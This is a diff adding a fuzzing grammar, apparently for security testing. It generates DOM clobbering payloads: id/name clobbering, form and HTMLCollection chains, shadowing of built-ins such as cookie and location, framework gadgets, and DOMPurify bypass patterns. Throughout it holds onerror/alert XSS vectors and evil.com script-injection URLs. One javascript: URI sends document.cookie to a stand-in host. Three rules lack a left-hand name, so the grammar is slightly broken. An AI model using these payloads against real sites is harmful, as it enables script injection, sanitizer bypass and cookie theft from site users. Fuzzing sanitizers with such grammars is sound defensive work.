@@ -1,0 +1,263 @@
+# =============================================================================
+# DOM Clobbering Grammar — HTML payloads for named property pollution
+# Covers: id/name clobbering, HTMLCollection chains, form+child chains,
+#          anchor toString, built-in shadow, framework gadgets, combined vectors
+# =============================================================================
+
+!root <payload>
+!max_depth 6
+
+# =============================================================================
+# Top-level payload selection
+# =============================================================================
+<payload> = <level1_single>
+<payload> = <level2_chain>
+<payload> = <level3_triple>
+<payload> = <anchor_tostring>
+<payload> = <builtin_shadow>
+<payload> = <framework_gadget>
+<payload> = <combined_payload>
+
+# =============================================================================
+# Level 1: Single element with id or name attribute
+# =============================================================================
+<level1_single> = <div id="<target_name>"><l1_value></div>
+<level1_single> = <img id="<target_name>" src="<evil_url>">
+<level1_single> = <embed name="<target_name>" src="<evil_url>">
+<level1_single> = <object name="<target_name>" data="<evil_url>">
+<level1_single> = <form name="<target_name>"><l1_value></form>
+<level1_single> = <img name="<target_name>" src="<evil_url>">
+<level1_single> = <input id="<target_name>" value="<l1_value>">
+<level1_single> = <textarea id="<target_name>"><l1_value></textarea>
+
+<l1_value> = <evil_url>
+<l1_value> = <string min=3 max=20 charset=alphanumeric>
+<l1_value> = {"url":"<evil_url>"}
+<l1_value> = true
+<l1_value> = 1
+
+# =============================================================================
+# Level 2: HTMLCollection (duplicate ids) and form+child chains
+# =============================================================================
+
+# --- HTMLCollection via duplicate id ---
+<level2_chain> = <a id="<target_name>"></a><a id="<target_name>" name="<child_name>" href="<evil_url>">
+<level2_chain> = <a id="<target_name>"></a><a id="<target_name>" name="<child_name>" href="<js_uri>">
+<level2_chain> = <div id="<target_name>"></div><a id="<target_name>" name="<child_name>" href="<evil_url>">
+
+# --- Form + named child ---
+<level2_chain> = <form id="<target_name>"><input name="<child_name>" value="<evil_url>"></form>
+<level2_chain> = <form id="<target_name>"><img name="<child_name>" src="<evil_url>"></form>
+<level2_chain> = <form id="<target_name>"><input name="<child_name>" value="<l1_value>"><input name="<child_name2>" value="<l1_value>"></form>
+<level2_chain> = <form id="<target_name>"><button name="<child_name>" value="<l1_value>"></button></form>
+<level2_chain> = <form id="<target_name>"><output name="<child_name>"><l1_value></output></form>
+<level2_chain> = <form id="<target_name>"><textarea name="<child_name>"><evil_url></textarea></form>
+<level2_chain> = <form id="<target_name>"><select name="<child_name>"><option value="<evil_url>" selected>x</option></select></form>
+<level2_chain> = <form id="<target_name>"><input name="<child_name>" value="<img src=x onerror=alert(1)>"></form>
+
+# =============================================================================
+# Level 3: Triple chains (form + collection)
+# =============================================================================
+<level3_triple> = <form id="<target_name>" name="<target_name>"><input name="<child_name>" value="<evil_url>"></form><a id="<target_name>">
+<level3_triple> = <form id="<target_name>" name="<target_name>"><input name="<child_name>" value="<evil_url>"></form><form id="<target_name>"></form>
+<level3_triple> = <form id="<target_name>" name="<target_name>"><input name="<child_name>"><input name="<child_name2>" value="<evil_url>"></form><a id="<target_name>">
+<level3_triple> = <form id="<target_name>"><input name="<child_name>" value="<evil_url>"></form><form id="<target_name>"><input name="<child_name2>" value="<l1_value>"></form>
+
+# =============================================================================
+# Anchor toString: <a id=X href="evil_url"> — .toString() returns href
+# =============================================================================
+<anchor_tostring> = <a id="<target_name>" href="<evil_url>">
+<anchor_tostring> = <a id="<target_name>" href="<js_uri>">
+<anchor_tostring> = <a id="<target_name>" href="<data_uri>">
+<anchor_tostring> = <a id="<target_name>" href="<proto_relative_url>">
+<anchor_tostring> = <area id="<target_name>" href="<evil_url>">
+<anchor_tostring> = <a id="<target_name>" href="<evil_url>"><string min=3 max=10 charset=lower></a>
+
+# =============================================================================
+# Built-in shadow: name matching document.* builtins
+# =============================================================================
+<builtin_shadow> = <img name="<builtin_name>" src="<evil_url>">
+<builtin_shadow> = <embed name="<builtin_name>" src="<evil_url>">
+<builtin_shadow> = <form name="<builtin_name>"><l1_value></form>
+<builtin_shadow> = <a id="<builtin_name>" href="<evil_url>">
+<builtin_shadow> = <object id="<builtin_name>" data="<evil_url>">
+<builtin_shadow> = <div id="<builtin_name>"><img name="<child_name>" src="<evil_url>"></div>
+<builtin_shadow> = <form id="<builtin_name>"><input name="<child_name>" value="<evil_url>"></form>
+
+<builtin_name> = cookie
+<builtin_name> = domain
+<builtin_name> = referrer
+<builtin_name> = location
+<builtin_name> = URL
+<builtin_name> = body
+<builtin_name> = head
+<builtin_name> = forms
+<builtin_name> = getElementById
+<builtin_name> = querySelector
+<builtin_name> = title
+<builtin_name> = defaultView
+<builtin_name> = documentElement
+<builtin_name> = scripts
+<builtin_name> = styleSheets
+<builtin_name> = images
+<builtin_name> = anchors
+
+# =============================================================================
+# Framework gadgets: Webpack, Closure, AMP, analytics patterns
+# =============================================================================
+<framework_gadget> = <a id="<framework_name>" href="<evil_url>">
+<framework_gadget> = <img name="<framework_name>" src="<evil_url>">
+<framework_gadget> = <form id="<framework_name>"><input name="<framework_child>" value="<evil_url>"></form>
+<framework_gadget> = <form id="<framework_name>"><input name="<framework_child>" value="<l1_value>"><input name="<framework_child2>" value="<evil_url>"></form>
+<framework_gadget> = <embed name="<framework_name>" src="<evil_url>">
+<framework_gadget> = <a id="<framework_name>"></a><a id="<framework_name>" name="<framework_child>" href="<evil_url>">
+
+<framework_name> = __webpack_public_path__
+<framework_name> = __webpack_nonce__
+<framework_name> = __webpack_require__
+<framework_name> = CLOSURE_BASE_PATH
+<framework_name> = CLOSURE_UNCOMPILED_DEFINES
+<framework_name> = AMP_MODE
+<framework_name> = analytics
+<framework_name> = ga
+<framework_name> = _gaq
+<framework_name> = dataLayer
+<framework_name> = gtag
+<framework_name> = fbq
+
+<framework_child> = p
+<framework_child> = src
+<framework_child> = url
+<framework_child> = endpoint
+<framework_child> = version
+<framework_child> = base
+<framework_child> = nonce
+<framework_child> = path
+
+<framework_child2> = version
+<framework_child2> = mode
+<framework_child2> = debug
+<framework_child2> = path
+
+# =============================================================================
+# Combined: multiple vectors in one payload
+# =============================================================================
+<combined_payload> = <level1_single><level1_single>
+<combined_payload> = <anchor_tostring><builtin_shadow>
+<combined_payload> = <level2_chain><builtin_shadow>
+<combined_payload> = <framework_gadget><level1_single>
+<combined_payload> = <anchor_tostring><framework_gadget>
+<combined_payload> = <ns_wrapper><level1_single></ns_close>
+<combined_payload> = <ns_wrapper><anchor_tostring></ns_close>
+<combined_payload> = <ns_wrapper><level2_chain></ns_close>
+<combined_payload> = <level2_chain><img src=x onerror=alert(1)>
+<combined_payload> = <level1_single><script>alert(1)</script>
+
+# --- Namespace wrappers (SVG, MathML) ---
+<ns_wrapper> = <svg><foreignObject>
+<ns_wrapper> = <math><mtext>
+<ns_wrapper> = <svg><desc>
+
+<ns_close> = </foreignObject></svg>
+<ns_close> = </mtext></math>
+<ns_close> = </desc></svg>
+
+# =============================================================================
+# Target name pools — security-relevant property names
+# =============================================================================
+
+# --- Config/settings ---
+<target_name> = config
+<target_name> = settings
+<target_name> = options
+<target_name> = opts
+<target_name> = params
+<target_name> = env
+<target_name> = context
+
+# --- URL-related ---
+<target_name> = baseUrl
+<target_name> = defaultUrl
+<target_name> = cdnUrl
+<target_name> = apiUrl
+<target_name> = apiEndpoint
+<target_name> = templateUrl
+<target_name> = baseURI
+<target_name> = scriptUrl
+
+# --- Script/module ---
+<target_name> = currentScript
+<target_name> = scripts
+<target_name> = src
+<target_name> = module
+<target_name> = imports
+<target_name> = template
+
+# --- Random ---
+<target_name> = <string min=3 max=16 charset=lower>
+<target_name> = <string min=3 max=8 charset=lower>_<string min=3 max=8 charset=lower>
+
+# --- Child property names ---
+<child_name> = url
+<child_name> = src
+<child_name> = href
+<child_name> = action
+<child_name> = data
+<child_name> = value
+<child_name> = innerHTML
+<child_name> = textContent
+<child_name> = baseUrl
+<child_name> = apiUrl
+<child_name> = path
+<child_name> = base
+<child_name> = method
+<child_name> = type
+<child_name> = <string min=3 max=12 charset=lower>
+
+<child_name2> = debug
+<child_name2> = mode
+<child_name2> = version
+<child_name2> = type
+<child_name2> = method
+<child_name2> = path
+<child_name2> = <string min=3 max=12 charset=lower>
+
+# =============================================================================
+# Evil URLs and URI schemes
+# =============================================================================
+<evil_url> = https://evil.com/
+<evil_url> = https://evil.com/inject.js
+<evil_url> = https://evil.com/steal?data=
+<evil_url> = //evil.com/
+<evil_url> = //evil.com/inject.js
+<evil_url> = //evil.com/malicious.js
+<evil_url> = //evil.com/<string min=3 max=12 charset=lower>.js
+<evil_url> = http://evil.com/<string min=3 max=12 charset=lower>
+
+<proto_relative_url> = //evil.com/
+<proto_relative_url> = //evil.com/inject.js
+<proto_relative_url> = //evil.com/<string min=3 max=12 charset=lower>.js
+<proto_relative_url> = //evil.com/malicious.js
+
+<js_uri> = javascript:alert(1)
+<js_uri> = javascript:alert(document.domain)
+<js_uri> = javascript:void(0)
+<js_uri> = javascript:fetch('//evil.com/'+document.cookie)
+
+<data_uri> = data:text/html,<script>alert(1)</script>
+<data_uri> = data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+<data_uri> = data:text/javascript,alert(1)
+
+# =============================================================================
+# Sanitizer bypass patterns (DOMPurify internals)
+# =============================================================================
+
+# Weighted realistic patterns
+<payload> = [weight=3] <form id="<target_name>"><input name="<child_name>" value="<evil_url>"></form>
+<payload> = [weight=3] <a id="<target_name>" href="<evil_url>">
+<payload> = [weight=2] <a id="<target_name>"></a><a id="<target_name>" name="<child_name>" href="<evil_url>">
+<payload> = [weight=2] <form id="<framework_name>"><input name="<framework_child>" value="<evil_url>"></form>
+<payload> = [weight=2] <img name="<builtin_name>" src="<evil_url>">
+<payload> = [weight=1] <form id="x"><input name="parentNode"><img src="x" onerror="alert(1)"></form>
+<payload> = [weight=1] <form id="x"><input name="remove"><img src="x" onerror="alert(1)"></form>
+<payload> = [weight=1] <form id="x"><input name="__depth"><div><img src="x" onerror="alert(1)"></div></form>
